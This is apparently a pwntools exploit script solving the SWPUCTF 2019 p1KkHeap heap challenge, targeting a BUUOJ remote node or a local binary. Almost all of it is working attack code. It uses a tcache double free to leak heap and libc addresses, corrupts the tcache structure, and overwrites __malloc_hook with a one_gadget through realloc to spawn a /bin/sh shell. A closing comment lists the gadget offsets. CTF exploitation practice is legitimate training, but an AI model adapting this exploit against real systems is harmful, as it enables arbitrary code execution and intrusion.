#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./SWPUCTF_2019_p1KkHeap')
	elf = ELF('./SWPUCTF_2019_p1KkHeap',checksec=False)
 	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote('node3.buuoj.cn',27063)
	elf = ELF('./SWPUCTF_2019_p1KkHeap',checksec=False)
 	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

def menu(cmd):
    sla("Your Choice: ",str(cmd))

def add(size):
    menu(1)
    sla("size: ",str(size))

def edit(idx,content):
    menu(3)
    sla("id: ",str(idx))
    sda("content: ",content)

def show(idx):
    menu(2)
    sla("id: ",str(idx))

def delete(idx):
    menu(4)
    sla("id: ",str(idx))

###leak heap###
add(0x80)#0
add(0x80)#1
add(0x80)#2
edit(2,'$0;')

delete(0)
delete(0)

add(0x80)#3 0
show(0)
ru("content: ")
heap = u64(ru('\x55')[-6:].ljust(8,'\x00')) - 0x260
success(hex(heap))

###leak libc###
structure = heap + 0x10
edit(3,p64(structure))

add(0x80)#4
add(0x80)#5
edit(5,p64(0x0700000000000000))

delete(0)
show(3)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x3ebc40
success(hex(libc_base))
pause()

###modify entry###
realloc = libc_base + libc.symbols['__libc_realloc']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4f322

payload = '\x00' * 0x78 + p64(malloc_hook - 0x8)
edit(5,payload)

add(0x80)#malloc_hook
edit(6,p64(one_gadget)+p64(realloc+0x9))

#success(hex(one_gadget))
#gdb.attach(p)

###get shell###
#delete(2)
ia()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''